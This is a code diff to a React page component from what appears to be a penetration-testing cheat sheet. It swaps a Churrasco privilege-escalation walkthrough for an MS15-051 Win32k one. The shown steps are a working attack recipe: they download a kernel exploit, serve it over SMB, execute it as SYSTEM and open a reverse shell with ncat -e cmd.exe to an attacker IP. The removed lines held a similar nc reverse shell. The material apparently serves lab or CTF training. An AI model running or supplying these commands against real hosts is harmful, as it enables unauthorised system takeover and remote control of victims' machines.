@@ -13,7 +13,7 @@ interface IProps {
   title: string;
 }
 
-const Churrasco = ({ title }: IProps) => {
+const MS15_051 = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -33,48 +33,47 @@ const Churrasco = ({ title }: IProps) => {
               color: "primary.main",
             }}
           >
+            <Typography variant="h6">Requirements</Typography>
+            <Typography>Windows 8.1 (and before)</Typography>
+            <Box sx={{ m: 4 }} />
             <Typography variant="h6">Description</Typography>
-            <Typography>Windows Server 2003 Vulnerability.</Typography>
+            <Typography>
+              A privilege escalation vulnerability exists due to the Win32k.sys
+              kernel-mode driver improperly handling objects in memory. A local
+              attacker can exploit this flaw, via a specially crafted
+              application, to execute arbitrary code in kernel mode.
+            </Typography>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 1</Typography>
-            <Typography>Get churrasco.exe</Typography>
+            <Typography>
+              Download the privilege escalation executable
+            </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {
-                "wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe"
+                "wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip"
               }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 1</Typography>
-            <Typography>Get nc.exe</Typography>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {"wget https://github.com/int0x33/nc.exe/raw/master/nc.exe"}
-            </SyntaxHighlighter>
-            <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 3</Typography>
-            <Typography>
-              Transfer churrasco.exe and nc.exe to victim machine
-            </Typography>
+            <Typography variant="h6">Step 2</Typography>
+            <Typography>Start an smbserver</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {"smbserver.py kali ."}
             </SyntaxHighlighter>
-            <Box sx={{ m: 2 }} />
-            <SyntaxHighlighter className="syntax" language="bash">
-              {"copy \\\\{attackerIP}\\kali\\{file} ."}
-            </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
-            <Typography variant="h6">Step 4</Typography>
-            <Typography>Start nc listener on attacker machine</Typography>
+            <Typography variant="h6">Step 3</Typography>
+            <Typography>Execute `ms15-051x64.exe` </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"nc -lvnp 5555"}
+              {'\\\\10.10.14.2\\kali\\ms15-051x64.exe "whoami"'}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 4</Typography>
             <Typography>
-              Run the exploit and get a callback to attacker machine
+              The above command can only execute one command as system. We want
+              to spawn a reverse shell as system.{" "}
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {
-                '.\\churrasco.exe "C:\\Tools\\nc.exe -e cmd.exe {ATTACKER_IP} 5555"'
+                '\\\\10.10.14.2\\kali\\ms15-051x64.exe "\\\\10.10.14.2\\kali\\ncat.exe -e cmd.exe 10.10.14.2 5555"'
               }
             </SyntaxHighlighter>
           </Typography>
@@ -84,4 +83,4 @@ const Churrasco = ({ title }: IProps) => {
   );
 };
 
-export default Churrasco;
+export default MS15_051;
